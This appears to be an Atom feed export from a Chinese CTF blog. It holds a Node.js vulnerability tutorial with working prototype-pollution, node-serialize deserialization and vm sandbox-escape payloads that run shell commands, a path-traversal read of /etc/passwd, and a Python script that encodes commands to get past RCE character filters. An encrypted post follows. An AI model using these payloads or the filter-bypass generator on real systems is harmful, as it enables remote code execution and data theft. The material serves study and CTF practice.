&quot;b&quot;:2&#125;;object1.__proto__.foo = &quot;Hello World&quot;;console.log(object1.foo);object2 = &#123;&quot;c&quot;:1, &quot;d&quot;:2&#125;;console.log(object2.foo);</code></pre><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416000347433.png" alt="image-20220416000347433"></p><p>最终输出了两个hello word</p><p>为什么object2在没有设置foo属性的情况下，也会输出Hello  World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</p><h2 id="merge操作导致原型链污染"><a href="#merge操作导致原型链污染" class="headerlink" title="merge操作导致原型链污染"></a>merge操作导致原型链污染</h2><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击。</p><p>例子:</p><pre><code class="javascript">function merge(target, source) &#123;for (let key in source) &#123;if (key in source &amp;&amp; key in target) &#123;merge(target[key], source[key])&#125; else &#123;target[key] = source[key]&#125;&#125;&#125;let object1 = &#123;&#125;let object2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)merge(object1, object2)console.log(object1.a, object1.b)object3 = &#123;&#125;console.log(object3.b)# merge() 函数用于合并两个数组内容到第一个数组。在本段代码的作用就是将待操作的对象merge到一个空对象中</code></pre><p>需要注意的点是：</p><p>在JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。</p><p>我们来看下，有和没有JSON解析的区别</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416001143881.png" alt="image-20220416001143881"></p><p>所以代码在执行过程中会存在这么一步</p><pre><code class="javascript">target[__proto__]=source[__proto__]可理解为  object.prototype = &#123;&quot;b&quot;: 2&#125; 导致了原型链污染</code></pre><p>最终输出的结果为：</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416000830058.png" alt="image-20220416000830058"></p><p>可见object3的b是从原型中获取到的，说明Object已经被污染了。</p><h2 id="Code-Breaking-2018-Thejs"><a href="#Code-Breaking-2018-Thejs" class="headerlink" title="Code-Breaking 2018 Thejs"></a>Code-Breaking 2018 Thejs</h2><p>题目源码下载：<a href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p><p>server.js</p><pre><code class="javascript">const fs = require(&#39;fs&#39;)const express = require(&#39;express&#39;)const bodyParser = require(&#39;body-parser&#39;)const lodash = require(&#39;lodash&#39;)const session = require(&#39;express-session&#39;)const randomize = require(&#39;randomatic&#39;)const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#39;/static&#39;, express.static(&#39;static&#39;))app.use(session(&#123;    name: &#39;thejs.session&#39;,    secret: randomize(&#39;aA0&#39;, 16),    resave: false,    saveUninitialized: false&#125;))app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; // define the template engine    fs.readFile(filePath, (err, content) =&gt; &#123;        if (err) return callback(new Error(err))        let compiled = lodash.template(content)        let rendered = compiled(&#123;...options&#125;)        return callback(null, rendered)    &#125;)&#125;)app.set(&#39;views&#39;, &#39;./views&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.all(&#39;/&#39;, (req, res) =&gt; &#123;    let data = req.session.data || &#123;language: [], category: []&#125;    if (req.method == &#39;POST&#39;) &#123;        data = lodash.merge(data, req.body)        req.session.data = data    &#125;        res.render(&#39;index&#39;, &#123;        language: data.language,         category: data.category    &#125;)&#125;)app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`))</code></pre><p>问题出在lodash.merge()函数,这个函数存在原型链污染漏洞。我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416004841823.png" alt="image-20220416004841823"></p><p>页面最终会通过lodash.template进行渲染</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416005502144.png" alt="image-20220416005502144"></p><p>跟踪到lodash/template.js中</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/QyN5JVOde3YL8aZ.png" alt="template_js.png"></p><p>如图可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。</p><p>继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/pwoVFrOyfzJX42M.png" alt="template_js01.png"></p><p>通过构造chile_process.exec()就可以执行任意代码了。</p><p>最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)：</p><pre><code>&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nglobal.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)//&quot;&#125;&#125;</code></pre><p>(这里直接用require会报错：ReferenceError: require is not defined</p><p>p神给了一个更好的payload：</p><pre><code>&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;id&#39;)&#125;\n//&quot;&#125;&#125;</code></pre><h1 id="node-serialize反序列化RCE漏洞-CVE-2017-5941"><a href="#node-serialize反序列化RCE漏洞-CVE-2017-5941" class="headerlink" title="node-serialize反序列化RCE漏洞(CVE-2017-5941)"></a>node-serialize反序列化RCE漏洞(CVE-2017-5941)</h1><p>漏洞出现在node-serialize模块0.0.4版本当中，使用<code>npm install node-serialize@0.0.4</code>安装模块。</p><p><strong>了解什么是IIFE：</strong></p><p>IIFE(立即调用函数表达式)是一个在定义时就会立即执行的 JavaScript 函数。</p><p>IIFE一般写成下面的形式：</p><pre><code>(function()&#123; /* code */ &#125;());// 或者(function()&#123; /* code */ &#125;)();</code></pre><ul><li><code>node-serialize@0.0.4</code>漏洞点</li></ul><p>漏洞代码位于node_modules\node-serialize\lib\serialize.js中：</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/aDr6o823Ux4F5Zw.png" alt="serialize_eval.png"></p><p>其中的关键就是：<code>obj[key] = eval(&#39;(&#39; + obj[key].substring(FUNCFLAG.length) + &#39;)&#39;);</code>这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个<code>function()&#123;&#125;()</code>函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload：</p><p><strong>构造Payload</strong></p><pre><code class="javascript">serialize = require(&#39;node-serialize&#39;);var test = &#123; rce : function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;,&#125;console.log(&quot;序列化生成的 Payload: \n&quot; + serialize.serialize(test));</code></pre><p>生成的Payload为：</p><pre><code class="javascript">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;&quot;&#125;</code></pre><p>因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个<code>()</code>，结果如下：</p><pre><code class="javascript">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;</code></pre><p>(这里不能直接在对象内定义IIFE表达式，不然会序列化失败)</p><p>传递给unserialize(注意转义单引号)：</p><pre><code class="javascript">var serialize = require(&#39;node-serialize&#39;);var payload = &#39;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(\&#39;child_process\&#39;).exec(\&#39;ls /\&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;&#39;;serialize.unserialize(payload);</code></pre><p>执行命令成功，结果如图：</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/V1hOMYz7fQ3KB6X.png" alt="serialize_result.png"></p><h1 id="Node-js-目录穿越漏洞复现-CVE-2017-14849"><a href="#Node-js-目录穿越漏洞复现-CVE-2017-14849" class="headerlink" title="Node.js 目录穿越漏洞复现(CVE-2017-14849)"></a>Node.js 目录穿越漏洞复现(CVE-2017-14849)</h1><p>漏洞影响的版本：</p><ul><li>Node.js 8.5.0 + Express 3.19.0-3.21.2</li><li>Node.js 8.5.0 + Express 4.11.0-4.15.5</li></ul><p>运行漏洞环境：</p><pre><code>cd vulhub/node/CVE-2017-14849/docker-compose builddocker-compose up -d</code></pre><p>用Burpsuite获取地址：<code>/static/../../../a/../../../../etc/passwd</code> 即可下载得到<code>/etc/passwd</code>文件</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/L8pV6gXoAnJSRQ4.png" alt="node_dir.png"></p><h1 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h1><p>vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸：</p><p>逃逸例子：</p><pre><code>const vm = require(&quot;vm&quot;);const env = vm.runInNewContext(`this.constructor.constructor(&#39;return this.process.env&#39;)()`);console.log(env);</code></pre><p>执行之后可以获取到主程序环境中的环境变量</p><p>上面例子的代码等价于如下代码：</p><pre><code>const vm = require(&#39;vm&#39;);const sandbox = &#123;&#125;;const script = new vm.Script(&quot;this.constructor.constructor(&#39;return this.process.env&#39;)()&quot;);const context = vm.createContext(sandbox);env = script.runInContext(context);console.log(env);</code></pre><p>创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。</p><p>因为<code>this.constructor.constructor</code>返回的是一个<code>Function constructor</code>，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是<code>return this.process.env</code>，结果是返回了主程序的环境变量。</p><p>配合<code>chile_process.exec()</code>就可以执行任意命令了：</p><pre><code>const vm = require(&quot;vm&quot;);const env = vm.runInNewContext(`const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()`);console.log(env);</code></pre><p>最近的mongo-express RCE(CVE-2019-10758)漏洞就是配合vm沙箱逃逸来利用的。</p><p>具体分析可参考：<a href="https://xz.aliyun.com/t/7056">CVE-2019-10758:mongo-expressRCE复现分析</a></p><h1 id="javascript大小写特性"><a href="#javascript大小写特性" class="headerlink" title="javascript大小写特性"></a>javascript大小写特性</h1><p>在javascript中有几个特殊的字符需要记录一下</p><p>对于toUpperCase():</p><pre><code>字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</code></pre><p>对于toLowerCase():</p><pre><code>字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</code></pre><p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p><p><strong>CTF题实例 - Hacktm中的一道Nodejs题</strong></p><p>题目部分源码：</p><pre><code class="javascript">function isValidUser(u) &#123;  return (    u.username.length &gt;= 3 &amp;&amp;    u.username.toUpperCase() !== config.adminUsername.toUpperCase()  );&#125;function isAdmin(u) &#123;  return u.username.toLowerCase() == config.adminUsername.toLowerCase();&#125;</code></pre><p>解题时需要登录管理员的用户名，但是在登录时，<code>isValidUser</code>函数会对用户输入的用户名进行<code>toUpperCase</code>处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。</p><p>但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是<code>toLowerCase</code>。所以这两个差异，就可以使用大小写特性来进行绕过。</p><p>题目中默认的管理员用户名为：hacktm</p><p>所以，我们指定登录时的用户名为：hacKtm 即可绕过<code>isValidUser</code>和<code>isAdmin</code>的验证。</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;危险函数所导致的命令执行&quot;&gt;&lt;a href=&quot;#危险函数所导致的命令执行&quot; class=&quot;headerlink&quot; title=&quot;危险函数所导致的命令执行&quot;&gt;&lt;/a&gt;危险函数所导致的命令执行&lt;/h1&gt;&lt;h2 id=&quot;eval&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="node.js" scheme="https://sakurahack-y.github.io/tags/node-js/"/>
    
  </entry>
  
  <entry>
    <title>rce常用脚本</title>
    <link href="https://sakurahack-y.github.io/2022/04/12/rce%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC/"/>
    <id>https://sakurahack-y.github.io/2022/04/12/rce%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC/</id>
    <published>2022-04-11T17:16:30.000Z</published>
    <updated>2022-04-11T17:17:22.381Z</updated>
    
    <content type="html"><![CDATA[<p>很好用，各种绕过姿势</p><pre><code class="python">from typing import finalimport stringdef realHex(num):    if num &lt;16:        return &quot;%0&quot;+hex(num)[2:]    else:        return &#39;%&#39;+hex(num)[2:]pattern=input(&quot;请输入正则过滤式,没有则直接回车跳过\n&quot;)#正则表达式修饰符re.I大小写不敏感,re.M多行匹配,影响^和$,re.S使得.匹配包括换行在内的所有字符,re.U根据Unicode字符集解析字符,影响\w,\W,\b,\B#建议回车跳过,这个功能很逊if pattern != &quot;&quot;:    import re    blacklist=[&quot;`&quot;,&quot;&#39;&quot;,&#39;&quot;&#39;,&quot;\\&quot;]    for i in range(32,255):        if  re.search(pattern,chr(i),re.I):            blacklist.append(chr(i))else:    #blacklist列表中的字符在生成的拼接字符串中不会被使用,除了部分是被过滤掉的字符，其余的如&#39;,&quot;等字符考虑可能会导致闭合等问题暂列入    #如果有其他的要求可以对blacklist列表进行删改    #!注意对于|和&amp;来说拼凑字符是相当困难的,并且可用范围实际上是31-255,这就导致了要这样用必须引号包裹,否则大概率GG    #比如&#123;,&#125;,;,|,&amp;,$等诸多符号不带引号会导致无法使用    blacklist=[]    for word in string.ascii_letters+string.digits:        blacklist.append(word)    blacklist+=[&quot; &quot;,&quot;^&quot;,&quot;~&quot;,&quot;|&quot;,&quot;&#39;&quot;,&#39;&quot;&#39;,&quot;\\&quot;]#print(blacklist)#不同于取反,一个目标字符串使用异或的方式可以获大量的可用拼接字符串,这里只取了1种组合的拼接字符串#如果需要获得更多拼接字符串查看该函数中的result列表def yiHuo(string):    global operationEffient    global blacklist    operationEffient=False    result=[]    finalstr=&#39;&quot;&quot;^&quot;&quot;&#39;    rawstr=string    for i in range(0,len(rawstr)):        result.extend([[]])    for k in range(0,len(rawstr)):        #这里更换范围        for i in range(1,255):           if(chr(i) not in blacklist):               #这里更换范围                for j in range(1,255):                    if(chr(j) not in blacklist):                        if(i^j==ord(rawstr[k]) and [hex(j).replace(&#39;0x&#39;,&quot;%&quot;),hex(i).replace(&#39;0x&#39;,&quot;%&quot;)] not in result[k]):                            result[k].extend([[realHex(i),realHex(j)]])    #在这里往下的函数部分,result列表均是可用的(已填充了获得的拼接字符串)    for i in range(0,len(result)):        if(len(result[i])==0):            return(&quot;该字符在现有黑名单和字符范围下无法拼接出-&gt;%s&quot;%(rawstr[i]))    for i in range(0,len(rawstr)):        finalstr=finalstr[:finalstr.find(&quot;^&quot;,0)-1]+result[i][0][0]+&#39;&quot;&#39;+finalstr[finalstr.find(&quot;^&quot;,0):]        finalstr=finalstr[:finalstr.rfind(&quot;&#39;&quot;,0)]+result[i][0][1]+finalstr[finalstr.rfind(&#39;&quot;&#39;,0):]    return finalstrdef quFan(string):    global operationEffient    global blacklist    operationEffient=False    result=[]    finalstr=&#39;~&quot;&quot;&#39;    rawstr=string    for i in range(0,len(rawstr)):        result.extend([[]])    for k in range(0,len(rawstr)):        #这里更换范围        for i in range(1,255):           if(chr(i) not in blacklist and chr(int(bin(~i &amp; 0xFF)[2:],2))==rawstr[k]):               result[k].extend([realHex(i)])    #print(result)    for i in range(0,len(result)):        if(len(result[i])==0):            return(&quot;该字符在现有黑名单和字符范围下无法拼接出-&gt;%s&quot;%(rawstr[i]))    for i in range(0,len(rawstr)):        finalstr=finalstr[:finalstr.rfind(&#39;&quot;&#39;,0)]+result[i][0]+finalstr[finalstr.rfind(&#39;&quot;&#39;,0):]    return finalstrdef rce_and(string):    global operationEffient    global blacklist    operationEffient=False    rawstring=string    result=[]    finalstr=&quot;&quot;    for i in range(0,len(rawstring)):        result.extend([[]])    for l in range(0,len(rawstring)):        for i in range(1,255):            for j in range(1,255):                if (chr(j) in blacklist) or (chr(i) in blacklist):                    continue                if chr(i&amp;j)==rawstring[l]:                    #注意&amp;在URL特殊含义,故需要URL编码                    result[l].append(&quot;\&quot;&quot;+realHex(i)+&quot;\&quot;%26\&quot;&quot;+realHex(j)+&quot;\&quot;&quot;)                    continue    for i in range(0,len(result)):        if(len(result[i])==0):            print(&quot;该字符在现有黑名单和字符范围下无法拼接出-&gt;%s&quot;%(rawstring[i]))            return    for i in range(0,len(result)):        if i == 0:            finalstr+=&quot;(&#123;&#125;)&quot;.format(result[i][0])        else:            finalstr+=&quot;.(&#123;&#125;)&quot;.format(result[i][0])    return finalstrdef rce_or(string):    global operationEffient    global blacklist    operationEffient=False    rawstring=string    result=[]    finalstr=&quot;&quot;    for i in range(0,len(rawstring)):        result.extend([[]])    for l in range(0,len(rawstring)):        for i in range(1,255):            for j in range(1,255):                if (chr(j) in blacklist) or (chr(i) in blacklist):                    continue                if chr(i|j)==rawstring[l]:                    result[l].append(&quot;\&quot;&quot;+realHex(i)+&quot;\&quot;|\&quot;&quot;+realHex(j)+&quot;\&quot;&quot;)                    continue    for i in range(0,len(result)):        if(len(result[i])==0):            print(&quot;该字符在现有黑名单和字符范围下无法拼接出-&gt;%s&quot;%(rawstring[i]))            return    for i in range(0,len(result)):        if i == 0:            finalstr+=&quot;(&#123;&#125;)&quot;.format(result[i][0])        else:            finalstr+=&quot;.(&#123;&#125;)&quot;.format(result[i][0])    return finalstrwhile(True):    operationEffient=True    target=input(&quot;请输入待转换字符\n&quot;)    while(operationEffient):        operation=input(&quot;请选择操作\n0-&gt;重新输入\n1-&gt;使用异或拼接\n2-&gt;使用取反获得\n3-&gt;使用二进制和\n4-&gt;使用二进制或\n&quot;)        if(operation==&quot;1&quot;):            result=yiHuo(target)            pass        elif(operation==&quot;2&quot;):            result=quFan(target)            pass        elif(operation==&#39;3&#39;):            result=rce_and(target)            pass        elif(operation==&#39;4&#39;):            result=rce_or(target)            pass        elif(operation==&quot;0&quot;):            break        else:            print(&quot;选择的操作无效&quot;)            continue        if result!=&#39;&#39;:            print(result)</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;很好用，各种绕过姿势&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;from typing import final
import string

def realHex(num):
    if num &amp;lt;16:
        return &amp;quo</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="脚本" scheme="https://sakurahack-y.github.io/categories/CTF/%E8%84%9A%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>timeline sec新人赛</title>
    <link href="https://sakurahack-y.github.io/2022/04/11/timeline-sec%E6%96%B0%E4%BA%BA%E8%B5%9B/"/>
    <id>https://sakurahack-y.github.io/2022/04/11/timeline-sec%E6%96%B0%E4%BA%BA%E8%B5%9B/</id>
    <published>2022-04-11T13:46:45.000Z</published>
    <updated>2022-04-12T08:49:28.328Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="428e54a308c76cc06c7c2d72cf4499a827fc0118fcc10fae0cb9da6413e54d4d">329582d599d3308dd96c6b56d6bc1f822d06e9b899f44b25299bc2af72884e3d1abc9a4cd96e9c064d8877009252c5c8bcd41a7c27c6f8cf9a1e6130ca81228bdd9144fcf6846357a0c9d8613dcc392ecd3e717b8255092600bbf3f8d419080ed19a0846c44b23d901695644a103dccbc7497f4e6c767353ae14186ad319c9b10e346c6cb43e9b166bbc9460c4e81469b3eb647c6f7c9d73d32bfa139c259acfa805a31f9d5b268e0fc2d9dfecaca20e3159320fa37c99e5fe4ae174f454076e37b7e8060543ed6230a0cba0ee606e767a8a2dd902b2002b8a5be1729059d7a60bc517f8b4b6872eedb845107d7d09225ee136f571fe30e8a7544f4ab403b709e817759b736d015bbe2cc3e05bf0d89c627a8d00c3bb26f0fcc5386e6b7d7b5a236521d2b573c195e794a16974c995ccd1c511a60c0c919f8441e72ab4f5b9bd0a3d7f61076519ced1f9d9b2f521c925d5ef0080d88a41a212b5845108f2f88e01a03801c34b02a248e4daaf3e66df8ec5d93408136c89108c28ea5197198e8559b00cb948609a6cf418b1f4d7e8f9351ddf07d42df8382012f70f0877f112b2dd6a3b19fa80f104594b666a0e8cd541fad67df3828af720d60ab4e349b4b50c787a00d72d0008bf427ce2cc8e7f9c93fa28e309fca535d81ce5c9128d04e820c25c26d47ff59a726a6ec4dfb77e600a6ea1aae2155b1a881d64ef30d6868f28d2a516fb6a18a9013c012da9237487789d3e53731102f7a597070ef37ac49509ccf338144026af8e4f5943f708f7506145e46cab8f0947a199b1a1ba2210c8d7f468a0a62780cdbc1ca48ff4bce9dd2578d824dddc8c76ebce493d105b12bea66025995b2138e7357cfd97a8fa2016e25eb95230de7e3f9af4cf664f1b7579a26600a6c11560343b9619a1488af1daa6dd17098ccaf0a595e53e519f4820c7419b75ebdc7be32f0c5deb67b219f760de5e31fe60b66771c96d0036453a20c467b1d29194acc4ef5a39f751591ef328a4bdde6484ae80f925c6892ff2d0ff58edf291bc5830868791762749d43c114ac5f125b95eccca40b872cd517651dc52a9cefccf31398447e2788705bb9799750ac2aa4fa6b715435bb8efcb59bae5d787156d7dcc8340fff81bef5a80e6ce42d1fbfddfc8776b8243e4da8c8af7a86f08f97334513a311a27e803e0b9b8472c92603595a726c9f058fff54d544ff8d10e7618616eefe8239f0df69fd773c2148a9ec6f4d8e2f4d26fea86a116e329a40af27786cea6f5c878078476f1dc4b58ccd22b42eaa582362f7853a41a00cbb3c57863b808e393e3af80139d21109706c7f5ab07f33619d6493ef47cc96bb7a4f6b7c7782003d96ac9191f55dc7983d36e53a2aaaaccc48cd18394a46999f9f97d12500b16227fd2d43242319a8cd83a8d05ffba1517144f3e8877b1090ff0e94fcd615f26355f7b9dc11c8aff59a886abe67aa90e2dd2b10d9cc28a2ed8609f8ee8f1c592a518c515e167ade2509194c77b4efaa3c13918404a65b97e929a272e733808bd07647d8acc02efc40c8ae8dd6310f778391373e7004b00cbd0fc39601b60c4059c1bdfbf475b2ca5354a11740d482ad51d7a07a1e8677c8cb54dfa39069a9425f3e4d61df8786e6f06d04311c5b9a56e658f2b187ce5b0ade9439e9134000c8265f5e7b99e3953c6061c10c48fc8e1e515886edbcbf2e3dde8d66dcaab6fa9386c23326c78ff0fff8546e768ceba3a19df40338eae6a57e79a09ee1d83b74dcf7e0e77a47cb38f279ad4262fe20045fdb62f37d6005bb1a34f7fab0e339f3952b747926c8019c9f53926a96b4adddd1699920fbb29a5acfeddb676dc0d946bf12ad2eaf7eb86284cb3e477648eebedb8f05b35e58aa0343be98ac87f485d5279b0c592ffae6545d7a3676f4da3fea3e3d4c7b0f8f4b44971702a9ab6ba91153879349f7d66f161345f082bc20be3ba21255d1c70df472f6990fbdc8dc273a950d14db7553d3d0125710d06ef35ef9dbf785466cb33e31fa0d94e361f106586bcbd56ac948fd7fdadecf8a586312212d01c5080791c9ef7c800cd781a41936231108f915a971112c3ca18343f237fba3a45830252d9d6d1fa4cf7a29851f24e605526ac900eaf68ca1d5209064982bd11f31255e42699be684e241a7c0648624ece30150ba54b91af2e5d052ddf157a3ab9ecfd3ffaebf5c6e99179efaae43d10746ab697e6cc3a04927ecd1068718e02cde5229d9684d39fca866c9fcfb568a8c5270573762b8e9b2925d235d2aa0a7208f2a4d90788585914bce49be77447a6d3a2efd5a285316a0002c9d55f65e4a3d3a96c4439ccd7202fac0f0cd3a46bfd4bb70f07722b83c8b7a112db0d10e5c9d0aa8a5f8578bd224197f3ac0e9a49cbee7c239901bd49c938ea16a4da2f76972cde91e5cab429c3ed5b0897a8e889cc3968e22c4b656a90eaee5d2a7836d42b55eaedc8c6f72880816f09acb582b5352a0171f90513913ba94534d144f597a1b91ef248c625f526fbcc8f7f7cbc136dba515cdcc4970761fb39129a1713b32c76a4677af646c2aa13d2a87469f387e080bc9b0f83454c165e9b043b26fa8ead3b4070303aea73737084d07146e8e66cb18efd71dd1cd3043638b0317a941cc44f409acb7bf8a3213d8ce2b6290b73058394862242583fb2a56571a0f0b7a0241cbd547f5527476cf3b0c92bd04fb4967259a40f5773550a7c80047be30e4bd61eed384d21db5e1ea0eda8eb572dfc8c5ad75eb52330e320e087478cf2cee5de6afd0cd1c481073df5592651d3d441c455d57adfa2cc63b508f1dd26d08fb5e73ece1fd881907886a83d9b4b924a0ba8499a743f38e9a72aa2c3086a4376fc7348c395c489ca1b7792d10ecf2069ca1c404fe5cd3e9ee094927bbb8a9f02b4213f387e02b0891734ca4228a0369ecd9bfa70367b5103651aaa76e5da29297e661b7b0d9ec90b4bc6512c49107a07f07590c8d68a4f0af61333b6406fa03dc9ebb3ab6843ac965f90441113a54c6c13793d218774e3f09099cef9e33a9fc20220cd663343f8f1105e6cdca8ab479e9c511a4e56499026ce27c1b747001e42fff9430d6ee857de9d427f476d022fe462f9dddfa652586b5995cd6a111557eed0f770b743aee17d7f3f50196d803f6ff4daae6ce3d0f9ac0e50e5284993c5556b971c1f2b17d0303453f93f1fddb5cd541d374a045748d7b8776dc9f606ae358887b6d6b90f23348b0d57458364d2ecd76474364278a2b1fce7fb7ffff10800082d0b9fedbab82039f3ba1ba680958813407ed288f07b04be926f653f3303947de3b7eca127668a8f267e14bed5c6272d45cf50c76e70de24e24aee576c5c5401c89f5ebe9cff81125cad6599da3624b046e2acde0a0b7f615449905d17dff132c6b1b2583b1a56f9350a0cb995f7b32ed68367a489baabf213f21d058550725d83ab3f909ef3187b6f89ef0b9d2852cef01ce66f95f66ea5e67eecf854f1f45f841891242dddf616dc03b1946df3913b393ee44c8c18d982dcb1308af2e10786198f7969aaa76d91f34b43eb964a74513294c3e3f80ba31686fa4c2f03b5b30ea63b6b6ed50c4785d398f4c81da113b532de964ce0bf306ee7a3f6455091b5c8ff27e6b4128fbb83c5383d2401ce14a7146f63e268b179ac196bee7b3ae3b047a940ac5d3343dd375aa4ac98945d7efd83203348d6d2f3992674334196892c32ff83396d52a91adc74fd94cea277b95916f68663865cdd3bee1d7641e5531ab4a5c5d386d1ade07514eba377bddfd5403e9cc6091ed9e47428aa0d52d04b0857ae6d70477f407c96f673412d99d03d98417dc42d593d644e96dc293161f94a4dbce11db5098fab92e688cfd41e9667085841c535e2a48e9eff907bf3e0cac0d02c363d4611b37c073aaf6d50dc09eeaa3f92cde008c21e2068aafb836e0d07ad37cbd347207045eb0932decb06f5942eb0436ac38590be747853f8093240c3df86770c212bb59f91fddde1fe1538dd5f07542b5c62ae124a95604eb630068809c472c6ce8260c4ef28d01f8bb45cf7bee33e94d69a10f5f1d3c1104f6e74a1703ac851e2c4e327c5b6a7c6ec7f18a09359efcc50342147b4527324672921c0847224c04c64f04e5f3370346cbf258eb07a12b3248fad6781c927fb04e66ace5f6ec20bc111cf276dbaac52be64ec3ffac93fff6adadf21fafaad872a55f24cb3325438002287b53a5417563fb41b002f5ed7ad9226f637d148b6c49beda61608c954d86d5fd41550b63510ce0f6f947e22d6d9d839c13d01b02ab56899ac1c66763d9e3de0702823e9c4764941cec2e8408145eca635651cbe086532220eb0f3586b4877dd35c2020e9aa5e6369172c0dd7a0a28081973f85505128c80be4b8576987e1cbe55d9ddbb24b4efeaa1902c49a2f785fa6f68bc999c1b0f230d05e6d7feb4ae82d8580220e618c92e63b98ae7318ca013f518bdb6e140c3c3585c91129c1685f6bc3d572c87ebe71c3b78b8747a4979a23d4ae783f1648cbd3acc34434b6518e47a06ccc76c4f07d23520287659321beb01691f278b2bca5a7a292b86ffdd26a9cb57a3b93142321c584eb18dbb56af58f6077a2c3365e35aa34a